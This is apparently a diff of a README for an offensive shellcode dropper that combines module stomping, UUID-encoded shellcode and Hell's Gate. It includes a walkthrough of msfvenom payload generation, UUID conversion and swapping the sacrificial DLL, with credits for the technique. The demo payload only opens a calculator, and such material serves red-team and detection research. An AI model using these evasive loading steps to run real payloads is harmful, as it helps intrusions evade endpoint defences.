@@ -1,7 +1,8 @@
 # Module-Stomping UUID2Shellcode HellsGate Dropper
  Dropper that loads DLL into memory, changes DLL .TEXT section to RW, decodes shellcode from UUID &amp; writes to DLL .TEXT section, changes DLL .TEXT section back to RX, and uses EnumSystemLocalesA() to jump to shellcode &amp; execute!
 
-## MSFVenom PopCalc Shellcode Creation
+## Walkthrough Example with MSF PopCalc
+### MSFVenom PopCalc Shellcode Creation
 ```bash
 ┌──(bobby.cooke@0xBoku)-[~]
 └─$ msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
@@ -12,7 +13,7 @@ Payload size: 276 bytes
 Saved as: calc.bin
 ```
 
-## Raw Shellcode File to UUIDs
+### Raw Shellcode File to UUIDs
 ```bash
 ┌──(bobby.cooke@0xBoku)-[~]
 └─$ python3 bin2uuid.py calc.bin                                                                      
@@ -39,15 +40,16 @@ Saved as: calc.bin
     };
 ```
 
-## Copy UUID Shellcode to `main.c`
+### Copy UUID Shellcode to `main.c`
 
-## Optionally Change Sacraficial DLL
+### Optionally Change Sacraficial DLL
 ```bash
 ┌──(bobby.cooke@0xBoku)-[~]
 └─$ python3 string2array.py sLib mshtml.dll
 CHAR sLib[] = {'m','s','h','t','m','l','.','d','l','l',0};
 ```
 + Replace the `CHAR sLib[]` array in `main.c` with the newly generated one.
+
 ## Credits / References
 + [Stephan Borosh (rvrsh3ll|@424f424f)](https://twitter.com/424f424f) & [Matt Kingstone](https://twitter.com/n00bRage) for showing me the awesome UUID shellcode loading technique.
 + [ajpc500/binToUUIDs.py](https://gist.github.com/ajpc500/a9695eca6a660d1fb5ec30a2e356f33e)
